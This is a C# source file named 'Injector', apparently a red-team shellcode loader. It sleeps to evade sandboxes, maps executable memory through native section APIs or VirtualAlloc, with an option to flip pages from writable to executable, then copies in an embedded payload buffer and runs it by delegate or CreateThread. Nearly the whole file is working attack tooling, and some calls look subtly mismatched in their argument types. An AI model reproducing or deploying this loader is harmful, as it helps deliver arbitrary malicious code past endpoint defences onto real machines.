using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security;

namespace Injector {
    public class Program {
        public static void Main(string[] args) {
            Thread.Sleep(Global.sleep_time * 1000);
            #if _DEBUG_
                Console.WriteLine("sleeping for {0} seconds!\n", Global.sleep_time);
            #endif
            #if PINVOKE
                IntPtr baseAddr = VirtualAlloc(0, (UInt32)Global.my_buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            #else
                Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
                largeinteger.LowPart = (uint)Global.my_buf.Length;
                IntPtr section = IntPtr.Zero;
                if (Natives.ZwCreateSection(
                    ref section,
                    Natives.GenericAll,
                    IntPtr.Zero,
                    ref largeinteger,
                    #if RX
                    Natives.PAGE_READWRITE,
                    #else
                    Natives.PAGE_EXECUTE_READWRITE,
                    #endif
                    Natives.SecCommit,
                    IntPtr.Zero) != 0) {
                    #if _DEBUG_
                        Console.WriteLine("error in Natives.ZwCreateSection");
                    #endif
                    return;
                }

                #if _DEBUG_
                    Console.WriteLine("Created section @ 0x{0:x}", section);
                #endif

                IntPtr soffset = IntPtr.Zero;
                IntPtr baseAddr = IntPtr.Zero;
                IntPtr viewSize = (IntPtr)Global.my_buf.Length;
                if (Natives.ZwMapViewOfSection(
                    section,
                    Process.GetCurrentProcess().Handle,
                    ref baseAddr,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    soffset,
                    ref viewSize,
                    1,
                    0,
                    #if RX
                    Natives.PAGE_READWRITE,
                    #else
                    Natives.PAGE_EXECUTE_READWRITE
                    #endif
                    ) != 0) {
                    #if _DEBUG_
                        Console.WriteLine("error in Natives.ZwMapViewOfSection");
                    #endif
                    return;
                }

                #if _DEBUG_
                    Console.WriteLine("Mapped view of section @ 0x{0:x}", baseAddr);
                #endif
            #endif

            // equivalent to: Marshal.Copy(Global.my_buf, 0, baseAddr, Global.my_buf.Length);
            unsafe {
                byte* ptr = (byte*)baseAddr;
                for (uint i = 0; i < Global.my_buf.Length; i++) {
                    *(ptr + i) = Global.my_buf[i];
                }
            }

            #if RX
                int old = 0;
                #if PINVOKE
                    VirtualProtectEx(-1, baseAddr, Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
                #else
                    Natives.VirtualProtectEx(-1, baseAddr, Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
                #endif
            #endif

            #if SELFINJECT
                #if _DEBUG_
                    Console.WriteLine("self executing the payload");
                #endif
                Program.Delegates.FunctionRun FunctionRun = (Program.Delegates.FunctionRun)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(Program.Delegates.FunctionRun));
                FunctionRun();
            #elif PINVOKE
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, baseAddr, pinfo, 0, ref threadId);
                #if _DEBUG_
                    Console.WriteLine("Created thread 0x{0:x}...", hThread);
                #endif
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            #else
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                Natives.CreateThread(0, 0, baseAddr, pinfo, 0, ref threadId);
                #if _DEBUG_
                    Console.WriteLine("Created thread 0x{0:x}...", hThread);
                #endif
                Natives.WaitForSingleObject(hThread, 0xFFFFFFFF);
            #endif
        }

        public struct Delegates {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate void FunctionRun();
        }


        #if PINVOKE
        private static UInt32 MEM_COMMIT = 0x1000;
        #if RX
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        private static UInt32 PAGE_READWRITE = 0x04;
        #else
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        #endif

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern bool WriteProcessMemory(
            Int32 hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            Int32 nSize,
            ref Int32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hHandle,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
        #endif
    }
}
